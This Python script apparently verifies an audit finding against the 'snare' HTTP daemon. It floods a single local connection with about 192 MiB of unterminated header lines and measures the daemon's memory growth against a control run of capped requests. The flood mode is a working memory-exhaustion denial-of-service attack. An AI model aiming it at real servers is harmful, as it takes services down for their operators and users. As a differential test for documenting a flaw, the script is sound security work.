#!/usr/bin/env python3
"""scratch/s1_headerflood.py — the S1 (#111) differential.

Claim: snare's parse_get (src/httpserver.rs:326-383) caps only the BODY
(Content-Length <= 64 KiB, checked at :372-378). The request line and header
lines have no length or count cap: `read_line` accumulates without bound and
every line is pushed into a Vec. A single unauthenticated connection can
therefore make the daemon's memory grow with the attacker's input.

vuln  : ONE connection floods header lines totalling DOSE bytes (never a
        blank line, so headers never "complete"); VmRSS is sampled from
        /proc/<pid>/status throughout. Effect: RSS grows ~1:1 with input.
control: the SAME total byte volume delivered as well-formed requests with
        32 KiB bodies (inside the 64 KiB body cap) across many sequential
        connections. Effect: RSS stays flat — the byte volume is not the
        cause, the uncapped header path is.

Oracle prints only the claimed effect plus rounded evidence numbers.
Usage: s1_headerflood.py <pid> vuln|control
"""
import socket
import subprocess
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 18012
DOSE = 192 * 1024 * 1024  # 192 MiB of header bytes on one connection
LINE = b"X-canary-flood: " + b"a" * 8160 + b"\r\n"  # ~8 KiB per header line
BODY = b"x" * (32 * 1024)


def rss_mib(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024.0
    except OSError:
        pass
    return None


def sampler(pid, state):
    while not state["stop"]:
        v = rss_mib(pid)
        if v is not None and v > state["peak"]:
            state["peak"] = v
        time.sleep(0.05)


def vuln(pid):
    state = {"peak": rss_mib(pid), "stop": False}
    t = threading.Thread(target=sampler, args=(pid, state), daemon=True)
    t.start()
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(30)
    s.sendall(b"POST / HTTP/1.1\r\n")
    sent = 0
    while sent < DOSE:
        s.sendall(LINE)
        sent += len(LINE)
    time.sleep(1.0)  # let the reader thread drain and alloc settle
    peak = state["peak"]
    s.close()
    time.sleep(0.3)
    after = rss_mib(pid)
    return sent, peak, after


def control(pid):
    state = {"peak": rss_mib(pid), "stop": False}
    t = threading.Thread(target=sampler, args=(pid, state), daemon=True)
    t.start()
    req = (
        b"POST / HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"X-Github-Event: ping\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: "
        + str(len(BODY)).encode()
        + b"\r\n"
        b"\r\n"
        + BODY
    )
    sent = 0
    # same total volume as the flood, delivered as capped bodies
    n_req = DOSE // len(BODY)
    for _ in range(n_req):
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.settimeout(10)
        s.sendall(req)
        try:
            s.recv(256)
        except OSError:
            pass
        s.close()
        sent += len(req)
    time.sleep(0.5)
    peak = state["peak"]
    after = rss_mib(pid)
    return sent, peak, after


def main():
    pid = int(sys.argv[1])
    mode = sys.argv[2]
    start = rss_mib(pid)
    if mode == "vuln":
        sent, peak, after = vuln(pid)
    else:
        sent, peak, after = control(pid)
    mib = 1024 * 1024
    delta = peak - start
    print(f"RSS_START_MIB={start:.0f}")
    print(f"RSS_PEAK_MIB={peak:.0f}")
    print(f"RSS_AFTER_CLOSE_MIB={after if after is None else round(after):.0f}")
    print(f"BYTES_SENT_MIB={sent / mib:.0f}")
    print(f"RSS_DELTA_MIB={delta:.0f}")
    # effect: memory tracks attacker input (>=50% of the dose, far above
    # allocator/thread noise of a few MiB)
    if delta >= 0.5 * (sent / mib):
        print("CLAIM_EFFECT=unbounded_header_buffering")
    else:
        print("CLAIM_EFFECT=none")


main()
